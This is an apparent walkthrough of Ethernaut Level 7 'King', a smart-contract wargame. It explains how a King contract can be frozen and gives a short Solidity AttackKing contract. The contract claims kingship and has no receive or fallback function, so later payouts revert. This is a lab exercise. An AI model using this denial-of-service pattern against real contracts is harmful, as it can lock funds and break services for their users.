# Level 7: [King](https://ethernaut.openzeppelin.com/level/0x725595BA16E76ED1F6cC1e1b65A88365cC494824)

## Level objectives:
1. Send ether to become king.
2. Prevent re-claim during submission.

## Analysis
- On submission, the owner will try to reclaim the contract using the receive() function.
- If the require passes, the owner will become the king.
- Before the owner becomes king, the previous king is transferred some ether.
- We get the .transfer function stuck by not defining a fallback function in our contract.

## Steps:

```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.6;

contract AttackKing {
    King _victim = King(0xe22db7D56C1A88C98d4551dc9eD8e96A5729cb0c);
    constructor() public payable{
        address(_victim).call{value: _victim.prize()}("");
    }
}
```
